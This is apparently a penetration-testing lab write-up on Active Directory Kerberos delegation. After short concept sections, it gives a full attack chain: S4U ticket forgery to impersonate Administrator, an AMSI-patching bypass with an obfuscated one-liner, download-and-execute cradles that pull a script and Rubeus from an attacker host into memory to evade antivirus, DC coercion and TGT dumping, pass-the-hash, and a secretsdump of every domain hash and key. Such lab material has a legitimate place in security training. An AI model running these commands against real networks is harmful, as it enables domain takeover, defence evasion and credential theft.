In AD sometimes services that are used by users need to contact others, on behalf of the users, like for example a web server might contact a file server, and in order to allow a service to access another service, a solution has been implemented **Kerberos Delegation.**

This mechanism allows for example the **web server** to impersonate the user, authenticate on the user's behalf on the file server, and from the file server's point of view, it is the user who makes the request.

There are three ways to authorize a computer or service account to impersonate a user in order to communicate with other services:

- Unconstrained Delegation
- Constrained Delegation
- Resource Based Constrained Delegation

## Constrained Delegation

If a computer or a service account has **Constrained Delegation** flag set, a list of authorized services will be associated to this flag.

For example, in the previous example, the **web server** will have the **Constrained Delegation** flag which indicates that this account can only impersonate some users against CIFS service hosted by the server.

So the Domain Controller will read the SPN list on this account and will decide if the account is allowed to impersonate a user, so he can authenticate against one of these services on behalf of the user.

![Pasted_image_20250113093432](https://github.com/user-attachments/assets/0dfbe42e-1ff1-492f-93e0-1b9c66914308)

## Exploiting Constrained Delegation

For this I need first to find all the constrained delegation. To do this task, `findDelegation.py` can be used.

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

AccountName   AccountType  DelegationType                      DelegationRightsTo                         SPN Exists
------------  -----------  ----------------------------------  -----------------------------------------  ----------
jon.snow      Person       Constrained w/ Protocol Transition  CIFS/winterfell                            No
jon.snow      Person       Constrained w/ Protocol Transition  CIFS/winterfell.north.sevenkingdoms.local  No
CASTELBLACK$  Computer     Constrained                         HTTP/winterfell                            No
CASTELBLACK$  Computer     Constrained                         HTTP/winterfell.north.sevenkingdoms.local  Yes
```

### With Protocol Transition

This means that it allows a service to obtain a Kerberos ticket on behalf of a user, even if the user authenticated using a non-Kerberos protocol, such as NTLM authentication.

Now first let's ask a TGT for the user and execute S4U2Self followed by a S4U2Proxy in order to impersonate an admin user to the SPN on the target.

`getST.py` from impacket can be used for this task:

`getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '10.4.10.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'`

And the ticket is saved now:

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating Administrator
/home/kali/.local/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/kali/.local/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache
```

Then export the ticket:

`export KRB5CCNAME=/home/kali/Documents/delegations/Coercer/coercer/Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache`

Now let's use this to connect using `wmiexec.py`:

`wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell`

And I got connected:

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
north\administrator
```

# Unconstrained Delegation

The server or the service account can authenticate on behalf of the user to any other service.

For this to happen there are two prerequisites:
- Account that wants to delegate an authentication has the **TRUSTED_FOR_DELEGATION** flag in his **UAC - User Account Control** flag.To set this flag, you need to have the **SeEnableDelegationPrivilege** right, which is usually only available for Domain Administrators.
- The user account which will be relayed is **relayable.** To disable relaying capabilities on an account, **NOT_DELEGATED** flag is set. By default, no account on the AD has this flag set are all "relayable." 

During exchanges with the Domain Controller, when the users asks for a TGS, he will specify the SPN of the service he wants to use. At this point the Domain Controller looks for the two prerequisites:
- Is the **TRUSTED_FOR_DELEGATION** flag set in the attributes of the account associated to the SPN.
- Is the **NOT_DELEGATION** flag not set for the requesting user.

If both of these are met, the Domain Controller will respond to the user with a TGS containing standard information, but also contains a copy of the user's TGT in his response, and a new associated session key.

## Exploiting Unconstrained Delegation

First, get an RDP connection on Winterfell:

`xfreerdp /d:north.sevenkingdoms.local /u:eddard.stark /p:'FightP3aceAndHonor! /v:10.4.10.11 /cert-ignore`

In the Kali Machine prepare a folder with the `Rubeus.exe` and AMSI (Anti-malware Scan Interface) bypass.

In the folder, clone the following github repo for the Rubeus.exe, and keep only the Rubeus.exe file:

`https://github.com/r3motecontrol/Ghostpack-CompiledBinaries`

Prepare the ANSI bypass file, by creating a text document and pasting the following:

```txt
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

In the folder with the two files, start a python server:

`python3 -m http.server 8080`

Now, use the AMSI bypass in the rdp session:

`$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)`

`(new-object system.net.webclient).downloadstring('http://10.4.10.99:8080/amsi_rmouse.txt')|IEX`

![Pasted_image_20250113114737](https://github.com/user-attachments/assets/c98b7d72-c5a0-49c2-8227-35d7f7b3775f)

In order to avoid the possibility of being detected by antivirus or any endpoint detection tools, let's execute Rubeus from memory, instead of writing the executable file to disk.

And then see the available tickets:

`$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.99:8080/Rubeus.exe')`

`$assem = [System.Reflection.Assembly]::Load($data);`

`[Rubeus.Program]::MainString("triage");`

![Pasted_image_20250113115134](https://github.com/user-attachments/assets/23e23918-8dd3-420b-9229-1865d19a2c5a)

Now force a coerce of the KingsLanding to the Winterfell:

`coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell`

Continue some steps of the process by pressing the `c`.
![Pasted_image_20250113115734](https://github.com/user-attachments/assets/3113906a-b28e-4145-8904-80b62205f5ff)

Look at the triage again:

`[Rubeus.Program]::MainString("triage")`

And we see the `krbtgt` service from Kingslanding:

![Pasted_image_20250113115953](https://github.com/user-attachments/assets/2222fe51-3361-441d-8b35-6b9d288b3348)

Now to extract the tgt, relaunch again the coercer, do the same steps, and run the dump command in Rubeus.

`[Rubeus.Program]::MainString("dump /user:kingslanding$ /service:krbtgt /nowrap");`

![Pasted_image_20250113120149](https://github.com/user-attachments/assets/037ac6fc-5dad-49ca-9cb0-0acc921b27fe)

Save this to a file, and export it to the Kali Machine.

I did this by connecting via `wmiexec.py`:

`wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 eddard.stark@10.4.10.11`

Going to the directory where the file was saved and using the `lget` to retrieve it.

Afterwards, open it with vim, and add this in order to delete the whitespaces:

`:%s/\s//g`

The ticket is base64 encoded, so decode it and save to a kirbi file

`cat tgt.txt|base64 > ticket.kirbi`

Convert it to `ccache` file by using the ticketconverter.py:

`ticketconverter.py ticket.kirbi ticket.ccache`

Export it:

`export KRB5CCNAME=/home/kali/Documents/delegations/Coercer/coercer/ticket.ccache`

We see that the ticket is in the `klist` now:

```bash
Ticket cache: FILE:/home/kali/Documents/delegations/Coercer/coercer/ticket.ccache
Default principal: KINGSLANDING$@SEVENKINGDOMS.LOCAL

Valid starting       Expires              Service principal
01/13/2025 14:13:48  01/14/2025 00:13:48  krbtgt/SEVENKINGDOMS.LOCAL@SEVENKINGDOMS.LOCAL
	renew until 01/17/2025 19:38:50
```

Try a secretsdump:

`secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$@KINGSLANDING`

And we got the secrets!

```bash
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5c3a2910c238cb5a530b8b5369a6cf1e:::
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
tywin.lannister:1113:aad3b435b51404eeaad3b435b51404ee:af52e9ec3471788111a6308abff2e9b7:::
jaime.lannister:1114:aad3b435b51404eeaad3b435b51404ee:12e3795b7dedb3bb741f2e2869616080:::
cersei.lannister:1115:aad3b435b51404eeaad3b435b51404ee:c247f62516b53893c7addcf8c349954b:::
tyron.lannister:1116:aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998:::
robert.baratheon:1117:aad3b435b51404eeaad3b435b51404ee:9029cf007326107eb1c519c84ea60dbe:::
joffrey.baratheon:1118:aad3b435b51404eeaad3b435b51404ee:3b60abbc25770511334b3829866b08f1:::
renly.baratheon:1119:aad3b435b51404eeaad3b435b51404ee:1e9ed4fc99088768eed631acfcd49bce:::
stannis.baratheon:1120:aad3b435b51404eeaad3b435b51404ee:d75b9fdf23c0d9a6549cff9ed6e489cd:::
petyer.baelish:1121:aad3b435b51404eeaad3b435b51404ee:6c439acfa121a821552568b086c8d210:::
lord.varys:1122:aad3b435b51404eeaad3b435b51404ee:52ff2a79823d81d6a3f4f8261d7acc59:::
maester.pycelle:1123:aad3b435b51404eeaad3b435b51404ee:9a2a96fa3ba6564e755e8d455c007952:::
KINGSLANDING$:1001:aad3b435b51404eeaad3b435b51404ee:266a819ccba54527708c65febab712ad:::
NORTH$:1104:aad3b435b51404eeaad3b435b51404ee:ac819f7c593d51f56b614f3dcc10f193:::
ESSOS$:1105:aad3b435b51404eeaad3b435b51404ee:52bac9dd1cab3cdb208d7347118690d9:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5ca87118dd89b088de54fb17b009eccadacf97c564e4112a8d0958f9c929165d
Administrator:aes128-cts-hmac-sha1-96:961cd2fe40742376597e986a969ef586
Administrator:des-cbc-md5:b392b0ba3e3e1925
krbtgt:aes256-cts-hmac-sha1-96:f353b3ba6b9bdbe7b0917a4a73b8250f1938c568798a5a3307bf717fe713a48f
krbtgt:aes128-cts-hmac-sha1-96:6f531a15aa3dbd348c5bfbafdfa68124
krbtgt:des-cbc-md5:1f1aad648c3479c8
localuser:aes256-cts-hmac-sha1-96:96286517ab35191f2184b009d2c1347ea40c2aa6696428df79bcc5b0f4e8514c
localuser:aes128-cts-hmac-sha1-96:531c3e0f768242e32d8ba911abe36fc5
localuser:des-cbc-md5:ab1cefe994f7b5a8
tywin.lannister:aes256-cts-hmac-sha1-96:6d700f4ade8a38d18bdd4f149aab963dfd0dce88a66240abdbdcb9044677fb80
tywin.lannister:aes128-cts-hmac-sha1-96:e813c0778e005572a1bef0c1a5337b76
tywin.lannister:des-cbc-md5:8f2594dada98862a
jaime.lannister:aes256-cts-hmac-sha1-96:1ed5f614b71e193bba93dc07e14c1c445a27ff1a6b0f265e98b45b10f6940ba7
jaime.lannister:aes128-cts-hmac-sha1-96:d7befe9d0dbb7a6d925156d5642ba57f
jaime.lannister:des-cbc-md5:ec51389dd6b67076
cersei.lannister:aes256-cts-hmac-sha1-96:0cbbc101644c0d73d9155b71172c811d41a3a640fea655b1fd6d6a22fd53ca59
cersei.lannister:aes128-cts-hmac-sha1-96:9c22476a9d1c88b472a7567a4380e502
cersei.lannister:des-cbc-md5:10c7a8a2b3643468
tyron.lannister:aes256-cts-hmac-sha1-96:ee2568536d09581b7b5e30b707e58d27e2cf5ee7acfc90dce4de852e44c5633c
tyron.lannister:aes128-cts-hmac-sha1-96:9b7f0a412e6219a1b48b8fb12ff2d499
tyron.lannister:des-cbc-md5:013d7091a470c719
robert.baratheon:aes256-cts-hmac-sha1-96:6b5468ea3a7f5cac5e2f580ba6ab975ce452833e9215fa002ea8405f88e5294d
robert.baratheon:aes128-cts-hmac-sha1-96:4f12248736038b239853bcf1d4abad94
robert.baratheon:des-cbc-md5:49762afd1f38abf1
joffrey.baratheon:aes256-cts-hmac-sha1-96:a008819500909ab61b76564b0d81cf4f7cb1bd7f213206e25df681f92792aa8c
joffrey.baratheon:aes128-cts-hmac-sha1-96:504c606625e04cd3b61107b8a29fdd4d
joffrey.baratheon:des-cbc-md5:fbc262e5efa1160e
renly.baratheon:aes256-cts-hmac-sha1-96:9a71ce0dcb412d20641d5075513644255f08b2a9767b5e79f487e5103cc55385
renly.baratheon:aes128-cts-hmac-sha1-96:ed5fe1af8432bcc33921aa1ac4d8c071
renly.baratheon:des-cbc-md5:519b98239223cb07
stannis.baratheon:aes256-cts-hmac-sha1-96:01c636e600ae2cfb05695b13ff1e906662941de94323233580f369f16e2b295a
stannis.baratheon:aes128-cts-hmac-sha1-96:c6224aebad6b49e083bc70d99f02f612
stannis.baratheon:des-cbc-md5:370d626ea886aefe
petyer.baelish:aes256-cts-hmac-sha1-96:6e0ef6e1793e4ac90dc1afa073ddfd46fc117308d0f0b4cae68dd370cf7439c3
petyer.baelish:aes128-cts-hmac-sha1-96:6fcbd3ff8b3111772644a8d0912ac744
petyer.baelish:des-cbc-md5:73a867cbe910a78a
lord.varys:aes256-cts-hmac-sha1-96:50ab31c625a3544d17d0dd20ae6f3d1c195c846faca9ce187073fd886d2d8206
lord.varys:aes128-cts-hmac-sha1-96:a4607553a99e2ff4fa1bcb98b0020661
lord.varys:des-cbc-md5:349173d05e6d9bc1
maester.pycelle:aes256-cts-hmac-sha1-96:25370ba431b262bdf7ca279e88d824cd59b4ce280bbef537a96fe51c8d790042
maester.pycelle:aes128-cts-hmac-sha1-96:7d375f265062643302a4827719ea541d
maester.pycelle:des-cbc-md5:89379167f87f0b5b
KINGSLANDING$:aes256-cts-hmac-sha1-96:31c26f3811b55f25733ba86d5ef8bb69fc7996f63da0a71f701f9cf8c84fb70e
KINGSLANDING$:aes128-cts-hmac-sha1-96:b3e762fa06f11c8a40f21c2584bd15cf
KINGSLANDING$:des-cbc-md5:cd85b03b15fe7061
NORTH$:aes256-cts-hmac-sha1-96:9ea07688172b2ae6735381e5d800db6848b546d5536cb143b4edaed345ffb134
NORTH$:aes128-cts-hmac-sha1-96:843a818914a31220de10a02783b4f20a
NORTH$:des-cbc-md5:da29856baef80edc
ESSOS$:aes256-cts-hmac-sha1-96:e4bb187a355df477fad9870225ffe8ce5a98fdbbc1250396a519a4da12e1d211
ESSOS$:aes128-cts-hmac-sha1-96:9d84f46f723aaec1ecd483482d6d5de0
ESSOS$:des-cbc-md5:2f52158916f43d4f
```
# Resource Based Constrained Delegation

In this case, the DC will look at the attributes of **Resource B** instead of the Service. It will check that the account associated with the Service is present in the **mDS-AllowedToActOnBehalfOfOtherIdentity** attribute of the account liked to **Resource B.**

![Pasted_image_20250113093454](https://github.com/user-attachments/assets/e11662a5-db0c-422b-974d-0b538777f272)

So the difference is that in **Constrained Delegation** the relaying server holds the list of allowed target services, and in **Resource Based Constrained Delegation,** its the resources (or services) that have a list of accounts they trust for delegation.

